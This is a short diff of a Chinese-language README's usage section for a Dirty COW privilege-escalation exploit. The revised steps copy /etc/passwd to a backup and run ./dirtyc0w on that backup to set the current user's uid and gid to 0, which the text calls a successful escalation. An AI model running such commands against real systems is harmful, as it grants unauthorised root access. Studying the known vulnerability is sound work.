@@ -1,15 +1,12 @@
 # Usage
-首先确保你在普通权限下，然后执行就可以了
+这里仅仅是演示,我修改备份的/etc/passwd
 
 ```shell
-sh test.sh
+sudo cp /etc/passwd /etc/passwd.bak
+./dirtyc0w /etc/passwd.bak
 ```
+查看/etc/passwd.bak当前用户的uid和gid就被改为0了。提权成功
 
-成功的会在终端显示黄色的
-
-    procself mem success
-
-ps: 这里执行要求输入root密码是为了创建一个当前用户不具备写入权限的文件
 # Dirty COW
 
 Hello
